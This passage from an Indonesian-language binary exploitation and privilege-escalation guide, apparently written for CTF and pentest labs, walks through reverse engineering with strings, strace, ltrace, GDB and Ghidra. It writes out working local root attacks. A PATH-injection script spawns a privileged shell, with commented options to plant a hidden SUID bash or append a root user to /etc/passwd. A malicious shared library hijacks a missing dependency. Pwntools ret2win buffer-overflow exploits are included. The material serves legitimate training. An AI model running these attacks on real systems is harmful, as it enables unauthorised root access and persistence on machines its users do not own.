strings $BINARY

# Command 2: Minimum 8 karakter (filter noise)
strings -n 8 $BINARY

# Command 3: Cari keyword sensitif sekaligus (PALING BERGUNA)
strings $BINARY | grep -Ei 'password|passwd|secret|key|flag|token|http|https|curl|wget|bash|sh|system|exec|backup|usage|help|debug|admin|hidden|root|shadow'

# Command 4: Lihat semua strings dengan offset (untuk patching nanti)
strings -t x $BINARY | head -50   # -t x = offset dalam hex

# Simpan untuk referensi
strings $BINARY | tee ~/binary_analysis/static/strings_output.txt
```

**OUTPUT BERHASIL ✅ — Ketemu password/credential:**

text

```
SuperSecret123
Backup2023!
/etc/shadow
/root/.ssh/id_rsa
```

➡️ **JACKPOT!** Ada hardcoded credential atau path sensitif.  
➡️ Langsung coba: `ltrace $BINARY` untuk konfirmasi strcmp.

**OUTPUT BERHASIL ✅ — Ketemu command tanpa absolute path:**

text

```
Starting backup process...
backup
tar
cp
Backup complete!
```

➡️ Binary mungkin memanggil `backup` atau `tar` tanpa path absolut!  
➡️ Ini adalah **PATH Injection candidate**. Lanjut ke **Langkah 1.2 (strace)**.

**OUTPUT BERHASIL ✅ — Ketemu shell/execution strings:**

text

```
/bin/bash
/bin/sh
system
execve
popen
```

➡️ Binary ada yang berhubungan dengan shell execution. Analisis lebih lanjut dengan ltrace/Ghidra.

**OUTPUT BERHASIL ✅ — Ketemu flag/CTF clue:**

text

```
Congratulations!
flag{
HTB{
THM{
Access granted
win
```

➡️ Ini binary CTF dengan "win condition". Analisis logic untuk trigger kondisi ini.

**OUTPUT BERHASIL ✅ — Ketemu dangerous functions:**

text

```
gets
strcpy
strcat
sprintf
scanf
```

➡️ **Buffer overflow candidate!** Fungsi-fungsi ini tidak ada bounds checking.  
➡️ Lanjut ke **Fase 3 (Dynamic Analysis - Crash Testing)**.

**OUTPUT GAGAL ❌ — Strings kosong atau tidak berguna:**

text

```
[very few or garbage strings]
```

➡️ Binary mungkin:

- Packed/compressed → cek dengan `file` apakah ada UPX atau packer lain
- Encrypted strings → perlu Ghidra untuk decode
- Sangat kecil → semua logic inline

Bash

```
# Cek apakah ada packer
strings $BINARY | grep -i "UPX\|packed\|compressed"
# Cek entropy (binary terenkripsi punya entropy tinggi)
python3 -c "
import math, collections
data = open('$BINARY','rb').read()
cnt = collections.Counter(data)
entropy = -sum((c/len(data))*math.log2(c/len(data)) for c in cnt.values())
print(f'Entropy: {entropy:.2f} (>7.5 = likely packed/encrypted)')
"
```

---

### Langkah 0.5 — Library Dependencies

Bash

```
# Command 1: List shared libraries
ldd $BINARY

# Command 2: Jika binary executable, jalankan dengan strace untuk lihat library loading
strace -e trace=openat $BINARY 2>&1 | grep "\.so"

# Command 3: readelf alternatif
readelf -d $BINARY | grep NEEDED
```

**OUTPUT BERHASIL ✅ — Dynamic dengan library standard:**

text

```
linux-vdso.so.1 (0x00007fff...)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f...)
/lib64/ld-linux-x86-64.so.2 (0x00007f...)
```

➡️ Standard libc only. ltrace bisa digunakan. Tidak ada custom library yang menarik.

**OUTPUT BERHASIL ✅ — Ada library yang MISSING (MENARIK!):**

text

```
linux-vdso.so.1
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
libcustom.so => not found     ← INI MENARIK!
libcrypto.so.3 => /lib/x86_64-linux-gnu/libcrypto.so.3
```

➡️ `libcustom.so` tidak ditemukan → **Library Hijacking candidate!**  
➡️ Cek RPATH dan apakah ada direktori writable yang di-search:

Bash

```
# Cek RPATH (library search path yang di-hardcode)
readelf -d $BINARY | grep -Ei 'RPATH|RUNPATH'
# Output contoh: 0x000000000000001d (RPATH) Library rpath: [/opt/lib]

# Cek apakah /opt/lib writable
ls -la /opt/lib 2>/dev/null || echo "Directory tidak ada - bisa dibuat?"
touch /opt/lib/test 2>/dev/null && echo "WRITABLE!" || echo "Not writable"
```

**OUTPUT BERHASIL ✅ — Static binary:**

text

```
not a dynamic executable
```

➡️ Static binary. ltrace tidak akan bekerja. Gunakan strace + Ghidra saja.

---

### Langkah 0.6 — Enumerate Imported Functions

Bash

```
# Command 1: Dynamic symbols (imported functions)
objdump -T $BINARY | grep -v "^$" | grep -v "SYMBOL TABLE"

# Command 2: Filter fungsi berbahaya
objdump -T $BINARY | grep -E 'gets|strcpy|strcat|sprintf|scanf|system|execve|popen|printf'

# Command 3: Semua PLT stubs (functions dipanggil dari library)
objdump -d $BINARY | grep -E '<.*@plt>'

# Command 4: readelf alternative
readelf -s $BINARY | grep -E 'FUNC|GLOBAL'
```

**OUTPUT BERHASIL ✅ — Ada dangerous functions:**

text

```
0000000000401030 <puts@plt>:
0000000000401040 <printf@plt>:
0000000000401050 <strcmp@plt>:      ← Password comparison?
0000000000401060 <system@plt>:      ← Shell execution!
0000000000401070 <gets@plt>:        ← BUFFER OVERFLOW CANDIDATE!
0000000000401080 <strcpy@plt>:      ← BUFFER OVERFLOW CANDIDATE!
```

➡️ `system@plt` ada → binary bisa exec command. Cari argument-nya di Ghidra.  
➡️ `gets@plt` atau `strcpy@plt` ada → **HIGH PRIORITY BOF candidate!**

**OUTPUT BERHASIL ✅ — Ada fungsi menarik (win function):**

text

```
0000000000401234 <win>:
0000000000401256 <check_password>:
0000000000401289 <main>:
```

➡️ Ada fungsi `win`! Ini adalah ret2win pattern. Catat alamatnya untuk exploit nanti.

**Simpan semua info triage:**

Bash

```
# Buat summary
cat > ~/binary_analysis/static/triage_summary.txt << EOF
Binary: $BINARY
Date: $(date)
--- FILE ---
$(file $BINARY)
--- PERMISSIONS ---
$(ls -la $BINARY)
--- CHECKSEC ---
$(checksec --file=$BINARY 2>/dev/null)
--- INTERESTING STRINGS ---
$(strings $BINARY | grep -Ei 'password|secret|flag|system|exec|bash|gets|strcpy')
--- DEPENDENCIES ---
$(ldd $BINARY 2>/dev/null)
--- DANGEROUS FUNCTIONS ---
$(objdump -T $BINARY 2>/dev/null | grep -E 'gets|strcpy|system|execve|printf')
EOF
cat ~/binary_analysis/static/triage_summary.txt
```

---

## ═══════════════════════════════════════

## FASE 1: STATIC ANALYSIS LANJUTAN

## ═══════════════════════════════════════

> **Tujuan:** Dapatkan gambaran lebih detail tentang struktur binary sebelum menjalankannya.

### Langkah 1.1 — Readelf & Symbol Analysis

Bash

```
# Command 1: Lihat semua ELF sections
readelf -S $BINARY | head -40

# Command 2: Semua symbols (function names)
readelf -s $BINARY | grep -E 'FUNC|GLOBAL' | head -30

# Command 3: Jika not stripped, lihat semua function names
nm $BINARY | grep -E ' T | t ' | head -20   # T = text/code section

# Command 4: Lihat entry point
readelf -h $BINARY | grep "Entry point"
```

**OUTPUT BERHASIL ✅ — Symbols tersedia (not stripped):**

text

```
    42: 0000000000401234   156 FUNC    GLOBAL DEFAULT   14 main
    43: 0000000000401100    89 FUNC    LOCAL  DEFAULT   14 check_password
    44: 0000000000401050    45 FUNC    GLOBAL DEFAULT   14 win
    45: 0000000000401010    32 FUNC    GLOBAL DEFAULT   14 read_input
```

➡️ **EXCELLENT!** Kita tahu function names. Ghidra analysis akan jauh lebih mudah.  
➡️ Catat alamat fungsi menarik:

Bash

```
# Catat alamat penting
WIN_ADDR=$(nm $BINARY | grep " T win" | awk '{print $1}')
MAIN_ADDR=$(nm $BINARY | grep " T main" | awk '{print $1}')
echo "win() = 0x$WIN_ADDR"
echo "main() = 0x$MAIN_ADDR"
```

**OUTPUT BERHASIL ✅ — Binary stripped:**

text

```
[no symbols or very few]
nm: /opt/custom_backup: no symbols
```

➡️ Stripped. Nama function tidak tersedia secara langsung.  
➡️ Ghidra akan auto-analyze dan memberi nama seperti `FUN_00401234`. Perlu manual analysis.

---

### Langkah 1.2 — Disassembly Quick Look

Bash

```
# Command 1: Lihat main function
objdump -d $BINARY | grep -A 50 '<main>:'

# Command 2: Lihat semua functions
objdump -d $BINARY | grep -E '^[0-9a-f]+ <' | head -20

# Command 3: Cari call ke system()
objdump -d $BINARY | grep -B5 "call.*system\|call.*execve\|call.*gets\|call.*strcpy"

# Command 4: Lihat strings section untuk hardcoded values
objdump -s -j .rodata $BINARY 2>/dev/null | head -30
```

**OUTPUT BERHASIL ✅ — Ketemu call ke system:**

text

```
  401215:	48 8d 3d e4 0f 00 00 	lea    rdi,[rip+0xfe4]     # "backup"
  40121c:	e8 ef fd ff ff       	call   401010 <system@plt>
```

➡️ Binary memanggil `system("backup")` — **PATH injection!**  
➡️ Argument adalah `"backup"` tanpa absolute path → **Langsung ke Fase 2A**

**OUTPUT BERHASIL ✅ — Ketemu gets atau strcpy:**

text

```
  4011e8:	48 8d 45 c0          	lea    rax,[rbp-0x40]    # buffer size 0x40 = 64 bytes
  4011ec:	48 89 c7             	mov    rdi,rax
  4011ef:	e8 4c fe ff ff       	call   401040 <gets@plt>  # gets() = dangerous!
```

➡️ `gets()` dipanggil dengan buffer 64 bytes → **Classic BOF candidate!**  
➡️ Lanjut ke **Fase 3 (Crash Testing)** dan kemudian **File 49**

---

## ═══════════════════════════════════════

## FASE 2: DYNAMIC ANALYSIS — STRACE & LTRACE

## ═══════════════════════════════════════

> **Tujuan:** Lihat apa yang BENAR-BENAR dilakukan binary saat dijalankan.

### Langkah 2.1 — strace (System Call Tracer)

Bash

```
# Command 1: Trace semua syscalls
strace $BINARY 2>&1 | tee ~/binary_analysis/dynamic/strace_full.txt

# Command 2: Fokus pada file dan process execution (paling penting untuk PrivEsc)
strace -e trace=openat,read,write,execve,access $BINARY 2>&1 | tee ~/binary_analysis/dynamic/strace_filtered.txt

# Command 3: Follow child processes (-f) dan simpan ke file
strace -f -o ~/binary_analysis/dynamic/strace_fork.txt $BINARY 2>&1

# Command 4: Dengan argument
strace $BINARY arg1 arg2 2>&1 | head -50

# Command 5: Trace binary yang sudah berjalan (attach ke PID)
# strace -p $PID 2>&1
```

**OUTPUT BERHASIL ✅ — Ketemu execve tanpa absolute path (PATH Injection!):**

text

```
execve("/opt/custom_backup", ["/opt/custom_backup"], 0x7fff... /* 23 vars */) = 0
...
access("/usr/sbin/backup", F_OK)        = -1 ENOENT (No such file or directory)
access("/usr/bin/backup", F_OK)         = -1 ENOENT (No such file or directory)
access("/usr/local/bin/backup", F_OK)   = -1 ENOENT (No such file or directory)
execve("backup", ["backup"], 0x...)     = -1 ENOENT  ← INI YANG KITA CARI!
```

➡️ **CONFIRMED PATH INJECTION!** Binary memanggil `backup` dan mencarinya di PATH.  
➡️ **Langsung ke Fase 2A — PATH Injection Exploit**

**OUTPUT BERHASIL ✅ — Ketemu execve dengan absolute path:**

text

```
execve("/usr/bin/tar", ["/usr/bin/tar", "-czf", "/backup/data.tar.gz", "/data"], ...) = 0
```

➡️ Memakai absolute path `/usr/bin/tar` → PATH injection tidak berlaku.  
➡️ Cek apakah ada cara lain: argument injection? Library hijacking?

**OUTPUT BERHASIL ✅ — Ketemu openat file sensitif:**

text

```
openat(AT_FDCWD, "/etc/passwd", O_RDONLY) = 3
openat(AT_FDCWD, "/etc/shadow", O_RDONLY) = 4
```

➡️ Binary membaca file sensitif! Jika ini SUID binary, ini sangat menarik.

**OUTPUT BERHASIL ✅ — Ketemu network connection:**

text

```
connect(3, {sa_family=AF_INET, sin_port=htons(8080), sin_addr=inet_addr("192.168.1.1")}, 16) = 0
```

➡️ Binary melakukan network connection. Cek untuk SSRF atau data exfiltration.

**OUTPUT GAGAL ❌ — strace: Operation not permitted:**

text

```
strace: attach: ptrace(PTRACE_SEIZE, ...): Operation not permitted
```

➡️ ptrace diblokir (Yama security module atau tidak punya permission).

Bash

```
# Cek Yama ptrace scope
cat /proc/sys/kernel/yama/ptrace_scope
# 0 = semua bisa trace
# 1 = hanya parent process
# 2 = hanya root/admin
# 3 = tidak ada ptrace

# Jika punya sudo:
sudo strace $BINARY

# Atau copy binary dulu (jika SUID, copy akan hilangkan SUID)
cp $BINARY /tmp/binary_debug
strace /tmp/binary_debug
```

---

### Fase 2A — PATH Injection Exploit (Jika ditemukan dari strace)

Bash

```
# LANGKAH 1: Konfirmasi nama command yang dipanggil
strace $BINARY 2>&1 | grep execve | grep -v "/opt\|/usr\|/bin\|/sbin\|/lib"
# Output: execve("backup", ...) — "backup" adalah target kita

# LANGKAH 2: Buat fake command
FAKE_CMD="backup"   # Ganti dengan nama yang ditemukan dari strace
cat > /tmp/$FAKE_CMD << 'EOF'
#!/bin/bash
# Method 1: Langsung spawn bash sebagai root
/bin/bash -p

# Method 2: Copy bash dengan SUID (persistent)
# cp /bin/bash /tmp/.hidden_bash && chmod +s /tmp/.hidden_bash

# Method 3: Tambah user root baru
# echo "hacker:$(openssl passwd -1 'hacker123'):0:0:root:/root:/bin/bash" >> /etc/passwd
EOF

chmod +x /tmp/$FAKE_CMD

# LANGKAH 3: Verifikasi fake command
cat /tmp/$FAKE_CMD
ls -la /tmp/$FAKE_CMD

# LANGKAH 4: Inject PATH
export PATH=/tmp:$PATH

# LANGKAH 5: Konfirmasi PATH sudah benar
echo $PATH
which $FAKE_CMD    # Harus menunjuk ke /tmp/$FAKE_CMD

# LANGKAH 6: Jalankan SUID binary
$BINARY
```

**OUTPUT BERHASIL ✅ — Shell didapat:**

text

```
bash-5.1# id
uid=1001(alice) gid=1001(alice) euid=0(root) groups=1001(alice)
bash-5.1# whoami
root
```

➡️ **ROOT SHELL!** Verifikasi dan ambil flag:

Bash

```
cat /root/root.txt
cat /root/proof.txt
```

**OUTPUT GAGAL ❌ — Shell tidak muncul meskipun PATH sudah di-inject:**

text

```
Starting backup process...
Backup complete!
[tidak ada shell prompt baru]
```

➡️ Binary mungkin me-reset PATH atau menggunakan absolute path untuk shell.  
Investigasi lebih dalam:

Bash

```
# Cek apakah binary set ulang PATH
strace -e trace=execve $BINARY 2>&1 | grep -E "execve|PATH"

# Lihat environment yang diteruskan ke child process
strace $BINARY 2>&1 | grep "PATH="

# Coba dengan nama yang berbeda (mungkin strace tadi salah baca)
strings $BINARY | grep -v "^[A-Z/]" | grep -E "^[a-z]{3,10}$"
```

**OUTPUT GAGAL ❌ — execve gagal karena binary reset PATH:**

text

```
execve("/usr/local/bin/backup", ..., ["PATH=/usr/local/sbin:/usr/bin:/bin", ...]) = 0
```

➡️ Binary di-hardcode PATH. PATH injection tidak berlaku.  
➡️ Lanjut ke **Fase 2B (Library Hijacking)** atau **Fase 4 (Ghidra)**

---

### Langkah 2.2 — ltrace (Library Call Tracer)

Bash

```
# Command 1: Trace semua library calls
ltrace $BINARY 2>&1 | tee ~/binary_analysis/dynamic/ltrace_full.txt

# Command 2: Trace strcmp dan memcmp saja (untuk password check)
ltrace -e strcmp+memcmp+strncmp $BINARY 2>&1

# Command 3: Trace dengan argument
ltrace $BINARY arg1 2>&1

# Command 4: Trace dengan stdin input
echo "test_password" | ltrace $BINARY 2>&1

# Command 5: Filter output menarik
ltrace $BINARY 2>&1 | grep -E "strcmp|memcmp|strncmp|system|exec"
```

**OUTPUT BERHASIL ✅ — Ketemu hardcoded password:**

text

```
printf("Password: ")                                    = 10
__isoc99_scanf("%32s", 0x7fffffffe2c0)                  = 1
strcmp("test_password", "SuperSecret123")               = -38
puts("Access denied")                                   = 14
```

**Cara baca strcmp:**

text

```
strcmp(INPUT_KAMU, EXPECTED_VALUE)
         ↑                ↑
    "test_password"   "SuperSecret123"  ← INI YANG KITA CARI!
```

➡️ **Password ketemu: `SuperSecret123`**

Coba langsung:

Bash

```
echo "SuperSecret123" | $BINARY
# atau
$BINARY <<< "SuperSecret123"
```

**OUTPUT BERHASIL ✅ — Password benar, ada flag/shell:**

text

```
Password: Access granted!
flag{hardcoded_passwords_are_bad}
```

**OUTPUT BERHASIL ✅ — Ketemu system() call:**

text

```
system("backup -c /data")                              = 0
```

➡️ Argument `backup` tanpa absolute path → PATH injection berlaku!  
➡️ Kembali ke **Fase 2A**

**OUTPUT BERHASIL ✅ — Ketemu memcmp untuk key validation:**

text

```
memcmp("hello123", "\xde\xad\xbe\xef\xca\xfe\xba\xbe", 8) = -1
```

➡️ Binary membandingkan input dengan `\xde\xad\xbe\xef\xca\xfe\xba\xbe`.  
➡️ Coba masukkan byte tersebut:

Bash

```
printf "\xde\xad\xbe\xef\xca\xfe\xba\xbe" | $BINARY
```

**OUTPUT GAGAL ❌ — ltrace crash atau tidak ada output:**

text

```
ltrace: command not found
# atau
[binary crash immediately]
# atau
[no library calls shown]
```

➡️ Kemungkinan: static binary, anti-ltrace, atau binary crash sebelum interesting part.

Bash

```
# Cek apakah static
file $BINARY | grep static

# Jika tidak static, cek dengan lebih detail
ltrace -f $BINARY 2>&1 | head -30

# Gunakan strace sebagai fallback
strace $BINARY 2>&1 | head -30
```

---

### Langkah 2.3 — Input Testing (Crash Detection)

Bash

```
# Command 1: Tanpa argument
$BINARY

# Command 2: Berbagai input length
echo "test" | $BINARY
echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | $BINARY    # 32 A's
python3 -c 'print("A"*100)' | $BINARY
python3 -c 'print("A"*200)' | $BINARY
python3 -c 'print("A"*500)' | $BINARY
python3 -c 'print("A"*1000)' | $BINARY

# Command 3: Special characters
echo "%x %x %x %x %x" | $BINARY     # Format string probe
echo "%n" | $BINARY                   # Write primitive probe

# Command 4: Via argument
$BINARY $(python3 -c 'print("A"*200)')
$BINARY "$(python3 -c 'print("A"*200)')"

# Command 5: Catat saat crash pertama terjadi
for i in 50 100 150 200 300 500; do
    result=$(python3 -c "print('A'*$i)" | $BINARY 2>&1)
    status=$?
    echo "Length $i: exit=$status output='${result:0:30}'"
done
```

**OUTPUT BERHASIL ✅ — Binary crash (Segmentation fault):**

text

```
Segmentation fault (core dumped)
```

➡️ Binary crash dengan input panjang! Ini adalah **BOF candidate**.  
➡️ Lanjut ke **Fase 3 (GDB Analysis)**

**OUTPUT BERHASIL ✅ — Output berubah dengan %x (Format String!):**

text

```
# Input: "%x %x %x %x"
# Output: "40 2710 7ffe8a23 0"   ← INI ADALAH NILAI DARI STACK!
```

➡️ Binary vulnerable ke **Format String Attack!**  
➡️ Lanjut ke analisis Ghidra untuk konfirmasi: `printf(user_input)` tanpa format specifier.

**OUTPUT BERHASIL ✅ — Binary normal, tidak crash:**

text

```
[normal output, no crash]
```

➡️ Mungkin ada batas input, atau vulnerability bukan di sini.  
➡️ Lanjut ke **Fase 4 (Ghidra)** untuk analisis logic.

---

### Fase 2B — Library Hijacking Exploit

> Prasyarat: `ldd` menunjukkan library dengan "not found" di path yang writable

Bash

```
# LANGKAH 1: Konfirmasi library yang missing
ldd $BINARY | grep "not found"
# Output: libcustom.so => not found

# LANGKAH 2: Cek RPATH (dimana binary cari library)
readelf -d $BINARY | grep -Ei 'RPATH|RUNPATH'
# Output: 0x000000000000001d (RPATH) Library rpath: [/opt/lib]

# LANGKAH 3: Cek apakah directory dalam RPATH writable
RPATH_DIR="/opt/lib"   # Dari output di atas
ls -la $RPATH_DIR 2>/dev/null
touch $RPATH_DIR/test_write 2>/dev/null && echo "WRITABLE!" && rm $RPATH_DIR/test_write

# LANGKAH 4: Buat malicious shared library
LIB_NAME="libcustom.so"   # Nama dari ldd "not found"
cat > /tmp/malicious_lib.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void inject(void) {
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
EOF

gcc -shared -fPIC -o /tmp/$LIB_NAME /tmp/malicious_lib.c

# LANGKAH 5: Copy ke RPATH directory (harus writable)
cp /tmp/$LIB_NAME $RPATH_DIR/

# LANGKAH 6: Verify
ls -la $RPATH_DIR/$LIB_NAME
ldd $BINARY   # Library harus sudah resolve sekarang

# LANGKAH 7: Execute SUID binary
$BINARY
```

**OUTPUT BERHASIL ✅ — Shell spawned:**

text

```
root@target:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

**OUTPUT GAGAL ❌ — Library tidak dimuat:**

text

```
/opt/custom_backup: error while loading shared libraries: libcustom.so: cannot open shared object file
```

➡️ Nama library tidak cocok persis. Double-check:

Bash

```
# Lihat nama EXACT dari ldd
ldd $BINARY | grep "not found"
# Mungkin: libcustom.so.1 bukan libcustom.so

# Sesuaikan nama
cp /tmp/libcustom.so $RPATH_DIR/libcustom.so.1
```

---

## ═══════════════════════════════════════

## FASE 3: GDB ANALYSIS (CRASH INVESTIGATION)

## ═══════════════════════════════════════

> **Masuk sini jika:** Binary crash dari Fase 2.3, atau ada `gets/strcpy` dari checksec/strings

### Langkah 3.1 — Setup GDB dan Analisis Crash

Bash

```
# Setup GDB dengan pwndbg (jika tersedia)
gdb $BINARY

# Jika binary adalah SUID dan tidak bisa di-attach:
cp $BINARY /tmp/binary_debug
chmod u-s /tmp/binary_debug    # Hilangkan SUID dari copy
gdb /tmp/binary_debug
```

**Di dalam GDB:**

gdb

```
# Set Intel syntax (lebih mudah dibaca)
set disassembly-flavor intel

# Lihat fungsi yang ada
info functions

# Set breakpoint di main
break main
run

# Lihat disassembly
disassemble main

# Jalankan dengan input panjang untuk trigger crash
run <<< $(python3 -c 'print("A"*200)')

# Atau via file
# python3 -c 'print("A"*200)' > /tmp/input.txt
# run < /tmp/input.txt
```

**OUTPUT BERHASIL ✅ — RIP diisi A's (Buffer Overflow Confirmed!):**

text

```
Program received signal SIGSEGV, Segmentation fault.
0x0000414141414141 in ?? ()

Registers:
rip  0x0000414141414141  ← 0x41 = 'A', RIP DIKONTROL!
rsp  0x7fffffffe2c0
rbp  0x4141414141414141
```

➡️ **CONFIRMED BUFFER OVERFLOW!** RIP dikontrol oleh input kita.  
➡️ **Langsung ke Langkah 3.2 — Cari Offset**

**OUTPUT BERHASIL ✅ — Stack Canary detected:**

text

```
Program received signal SIGABRT, Aborted.
__GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:50
*** stack smashing detected ***
```

➡️ Ada stack canary. BOF lebih kompleks — perlu leak canary dulu.  
➡️ Lanjut ke **Fase 4 (Ghidra)** untuk cari canary leak.

**OUTPUT NORMAL ✅ — Tidak crash:**

text

```
[program selesai normal]
```

➡️ Input tidak cukup panjang, atau tidak ada overflow di titik ini.  
Coba lebih panjang atau lakukan di fungsi berbeda.

---

### Langkah 3.2 — Cari Offset (Cyclic Pattern)

Bash

```
# Method 1: Gunakan pwntools cyclic
python3 -c "from pwn import cyclic; print(cyclic(300).decode())" > /tmp/pattern.txt
# Atau langsung di shell:
python3 -c "from pwn import *; pattern = cyclic(300); open('/tmp/pattern.txt','wb').write(pattern)"

# Method 2: Jika pwntools tidak ada, gunakan msf pattern
# (perlu metasploit)
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300 > /tmp/pattern.txt
```

**Di dalam GDB:**

gdb

```
# Jalankan dengan cyclic pattern
run < /tmp/pattern.txt

# Setelah crash, lihat nilai RIP
info registers rip
# Output: rip  0x6161616661616166   ← nilai pattern

# Cari offset
# Di terminal lain:
# python3 -c "from pwn import cyclic_find; print(cyclic_find(0x6161616661616166))"
```

**OUTPUT BERHASIL ✅ — Offset ditemukan:**

Python

```
# Di terminal Python:
from pwn import *
offset = cyclic_find(0x6161616661616166)
print(f"Offset: {offset}")   # Output: Offset: 72
```

➡️ Offset adalah **72 bytes**. Artinya:

text

```
[72 bytes padding] + [8 bytes RIP] = 80 bytes total
```

➡️ Catat offset ini untuk exploit. **Lanjut ke File 49.**

Bash

```
# Simpan temuan
echo "Buffer Overflow Offset: 72 bytes" >> ~/binary_analysis/exploit/findings.txt
echo "Target binary: $BINARY" >> ~/binary_analysis/exploit/findings.txt
echo "checksec: $(checksec --file=$BINARY 2>/dev/null)" >> ~/binary_analysis/exploit/findings.txt
```

---

### Langkah 3.3 — Cari Function Addresses untuk ret2win

> Jika ada fungsi `win`, `flag`, atau `get_shell` dari Langkah 0.6

Bash

```
# Di GDB:
gdb $BINARY
```

gdb

```
# Cari alamat fungsi "win"
info functions win
print win
p win

# Atau lihat disassembly
disassemble win

# Catat alamatnya
# Output: 0x0000000000401234 is in win (/path/to/binary:12).
```

**Di luar GDB:**

Bash

```
# Cara lebih cepat
WIN_ADDR=$(nm $BINARY 2>/dev/null | grep " T win" | awk '{print "0x"$1}')
echo "win() address: $WIN_ADDR"

# Atau dengan readelf
readelf -s $BINARY | grep "win"
```

**OUTPUT BERHASIL ✅:**

text

```
0x0000000000401234 <win>
```

➡️ Alamat win function = `0x0000000000401234`  
➡️ Setelah tahu offset dari Langkah 3.2, exploit sederhana:

Python

```
from pwn import *
elf = ELF("./binary")
p = process("./binary")
offset = 72              # Dari Langkah 3.2
win_addr = 0x401234      # Dari sini
payload = b"A" * offset + p64(win_addr)
p.sendline(payload)
p.interactive()
```

➡️ **Lanjut ke File 49 untuk full exploit development.**

---

## ═══════════════════════════════════════

## FASE 4: GHIDRA — REVERSE ENGINEERING

## ═══════════════════════════════════════

> **Tujuan:** Memahami logic binary ketika static/dynamic analysis tidak cukup.

### Langkah 4.1 — Ghidra Setup dan Import

Bash

```
# Start Ghidra
ghidra &

# Atau dari terminal
/opt/ghidra/ghidraRun &

# Copy binary ke working directory
cp $BINARY ~/binary_analysis/ghidra/
```

**Workflow Ghidra step-by-step:**

text

```
1. File → New Project → Non-Shared Project → beri nama → Next/Finish
2. File → Import File → pilih binary
3. Klik "Yes" untuk Auto Analyze → pilih default analyzers → Analyze
4. Tunggu analysis selesai (progress bar di bawah)
5. Double-click binary di Project window → buka CodeBrowser
```

**Di CodeBrowser, navigasi ke main:**

text

```
Window paling kiri (Symbol Tree)
    → Functions (expand)
    → main (double-click)
```

---

### Langkah 4.2 — Analisis Decompiled Code

**Setelah buka main() di Ghidra, baca Decompiler window:**

**SCENARIO A — Password Check Pattern:**

C

```
// Decompiled code di Ghidra
int main(void) {
    char password[64];
    
    printf("Password: ");
    scanf("%63s", password);
    
    if (strcmp(password, "SuperSecret123") == 0) {   // ← HARDCODED PASSWORD!
        puts("Access granted");
        system("/bin/sh");                             // ← SHELL!
        return 0;
    }
    puts("Access denied");
    return 1;
}
```

➡️ **Password: `SuperSecret123`**  
➡️ Langsung test: `echo "SuperSecret123" | $BINARY`

**SCENARIO B — PATH Injection Pattern:**

C

```
int main(void) {
    puts("Starting backup...");
    system("backup -c /data");    // ← "backup" tanpa absolute path!
    puts("Done.");
    return 0;
}
```

➡️ Konfirmasi PATH injection. Lakukan exploit dari **Fase 2A**.

**SCENARIO C — Buffer Overflow Pattern:**

C

```
void read_input(void) {
    char buf[64];          // ← Buffer 64 bytes
    gets(buf);             // ← gets() = unlimited input = OVERFLOW!
    return;
}
```

➡️ Overflow at 64 bytes (mungkin + RBP = 72 bytes).  
➡️ **Lanjut ke File 49**

**SCENARIO D — Format String Pattern:**

C

```
void print_message(char *msg) {
    printf(msg);           // ← User input langsung ke printf! VULNERABLE!
}

// Seharusnya: printf("%s", msg);
```

➡️ **Format String vulnerability!**  
Test: `echo "%x %x %x %x" | $BINARY` → jika output berisi hex values → vulnerable.

**SCENARIO E — Hidden Function/Admin Mode:**

C

```
int main(int argc, char *argv[]) {
    if (argc > 1) {
        if (strcmp(argv[1], "--admin") == 0) {
            admin_shell();    // ← HIDDEN FUNCTION!
        }
    }
    normal_usage();
    return 0;
}
```

➡️ Jalankan dengan: `$BINARY --admin`

---

### Langkah 4.3 — Ghidra Tips untuk Analisis

text

```
# Rename fungsi yang tidak jelas (FUN_00401234 → check_password):
Right-click function name → Rename Function → ketik nama baru

# Follow function calls:
Double-click nama fungsi di decompiler → langsung jump ke fungsi itu

# Cari string tertentu:
Search → For Strings → ketik string yang dicari

# Cari cross-references (siapa yang memanggil fungsi ini):
Right-click fungsi → References → Show References to

# Lihat data di .rodata (hardcoded strings):
Window → Defined Strings → pilih dari list
```

**Google search jika buntu di Ghidra:**

text

```
Google: "ghidra [nama_fungsi_aneh] decompile trick"
Google: "ghidra analyze [binary_type] CTF"
Google: "[vulnerability class] binary analysis CTF walkthrough"
Google: "site:ctftime.org [binary name atau challenge type]"
```

---

## ═══════════════════════════════════════

## FASE 5: CTF-SPECIFIC PATTERNS

## ═══════════════════════════════════════

### Langkah 5.1 — Password Checker Pattern (Crackme)

Bash

```
# Quick approach: ltrace
ltrace ./crackme 2>&1 | grep -E "strcmp|memcmp|strncmp"

# Jika ltrace tidak bekerja, Ghidra
# Cari strcmp di Ghidra → lihat argument kedua = expected password

# Test password yang ditemukan
echo "FOUND_PASSWORD" | ./crackme
./crackme FOUND_PASSWORD    # Via argument
```

**Cara baca strcmp di ltrace:**

text

```
strcmp("user_input", "correct_password") = X
              ↑                ↑
         yang kamu masukkan  yang dicari!
```

---

### Langkah 5.2 — ret2win Pattern

Bash

```
# 1. Cari win function
nm ./binary | grep -E "win|flag|shell|success"

# 2. Cari buffer overflow
python3 -c 'print("A"*300)' | ./binary 2>&1

# 3. Di GDB, cari offset
gdb ./binary
(gdb) run <<< $(python3 -c "from pwn import cyclic; print(cyclic(300).decode())")
(gdb) info registers rip
# Cari offset dari RIP value

# 4. Buat exploit
python3 << 'EOF'
from pwn import *

elf = ELF("./binary")
p = process("./binary")

# Cari offset dulu (dari GDB)
offset = 72

# Alamat win function
win = elf.symbols['win']
print(f"[*] win() @ {hex(win)}")

# Buat payload
payload = b"A" * offset + p64(win)

p.sendline(payload)
p.interactive()
EOF
```

**OUTPUT BERHASIL ✅:**

text

```
[*] win() @ 0x401234
[+] Starting local process './binary': pid 12345
flag{ret2win_is_fun}
[*] Got EOF while reading in interactive
```

---

### Langkah 5.3 — Keygen/License Checker Pattern

Bash

```
# 1. Ghidra: cari fungsi transform/validate
# 2. Pahami algoritma transformasi
# 3. Reverse algoritma untuk generate valid key

# Atau: patch conditional jump
# Di Ghidra: cari JNE setelah comparison → patch jadi JMP atau NOP
# Atau di GDB: set $rip ke fungsi success langsung

# Quick GDB approach:
gdb ./keygen
(gdb) break check_license
